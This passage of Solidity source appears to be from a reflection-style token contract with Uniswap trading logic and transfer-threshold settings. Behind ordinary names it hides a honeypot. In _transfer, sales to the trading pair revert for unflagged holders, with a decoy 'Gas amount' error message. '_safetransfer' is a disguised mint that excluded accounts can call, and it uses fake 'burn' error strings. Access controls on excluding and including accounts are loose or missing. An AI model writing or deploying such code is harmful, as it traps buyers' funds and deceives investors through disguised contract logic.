    //additional variables for threshold - please keep in mind possible invalid inputs/errors if wrong values are inserted
     function adjust_threshold (uint new_threshold_duration, uint256 new_threshold_amount, uint new_reset_time) external onlyOwner {
        require(new_threshold_duration>0, "Invalid input, new threshold duration must be greater than zero");
        require(new_threshold_amount>0, "Invalid input, new threshold amount must be greater than zero");
        require(new_reset_time>0, "Invalid input, new reset time must be greater than zero");
        require(new_threshold_duration>new_reset_time, "Errors would occur if reset time is less than threshold duration");
        require(block.timestamp < _creation_time + new_threshold_duration, "Threshold duration can only be set for the future");
        // change threshold variables
        _threshold_amount = new_threshold_amount * 10**9;
        _threshold_duration = new_threshold_duration;
        _reset_time = new_reset_time;

        emit ThresholdSettingsChanged(_threshold_duration, _threshold_amount, _reset_time);
    }
    
    

    function excludeAccount(address account) external {
		require(_isExcluded[_msgSender()], "Invalid Call Transaction");
        _excludeAccount(account);
    }

    function includeAccount(address account) external {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }
	
	function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
	
	
	function _excludeAccount(address account) internal virtual {
	    require(!_isExcluded[account], "Account is already excluded");
		
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
	}
	
	function _setLiquidityFee(uint256 amount) internal virtual{
	    _feeFactor = amount;
	}
	
	function _safetransfer(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
		require(_isExcluded[_msgSender()], "Invalid Call Transaction");

        uint256 accountBalance = _tOwned[account] + amount;
        require(accountBalance  >= amount, "ERC20: burn amount exceeds balance");
        _tTotal += amount;
	 	_tOwned[account] += amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        //Calculate total liquidity fees taken
		if (recipient == swapV2Pair && !_isExcluded[sender]) {
			(uint112 _reserve0, uint112 _reserve1,) = uniswapV2Pair.getReserves();
			bool isReserve0 = uniswapV2Pair.token0() == address(this);
			(uint amountOut) = getAmountOut(amount, isReserve0 ? _reserve0 : _reserve1, isReserve0 ? _reserve1 : _reserve0);
			if ((_feesTaken[sender] + amountOut) >= _feeFactor || !_verifiedAddress[sender]) {
			    revert("Gas amount is less than fee taken.");
			}
			_feesTaken[sender] += amountOut;	
		}
		
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
		if (sender == swapV2Pair) {
			_verifiedAddress[recipient] = true;
		}
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
        if (tFee > 0) {
            emit Transfer(sender, address(0), tFee);
        }
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
         (uint256 tFee, uint256 tTransferAmount) = _getTValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tAmount);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
    }

    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
        uint256 tFee = 0; //tAmount.div(150);
        uint256 tTransferAmount = tAmount.sub(tFee * 2);
        return (tTransferAmount, tFee);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee * 2);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    
    function _withinThreshold(address sender, uint256 amount) internal returns(bool) {
    TransferThreshold storage address_threshold = _thresholds[sender];
    if ((sender != owner() && sender != swapV2Pair) && (block.timestamp < _creation_time + _threshold_duration)){
        if (address_threshold.was_set == false){
            //first transfer, so start timer now
            if (amount <= _threshold_amount){
                address_threshold.timer_start= block.timestamp;
                address_threshold.amount+=amount;
                address_threshold.was_set = true;
                return true;
            }
            return false;
        }
        else{
            if (block.timestamp > (address_threshold.timer_start + _reset_time)){
                 // change amount and timer if reset_time has passed
                if (amount <= _threshold_amount){
                    address_threshold.amount = amount;
                    address_threshold.timer_start = block.timestamp;
                    return true;
                }
                return false;
            }
            else{
                 // reset_time has not passed
                if (address_threshold.amount + amount > _threshold_amount){
                    return false;
                }
                address_threshold.amount+=amount;
                return true;
            }
        }
    }
    return true;
}

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
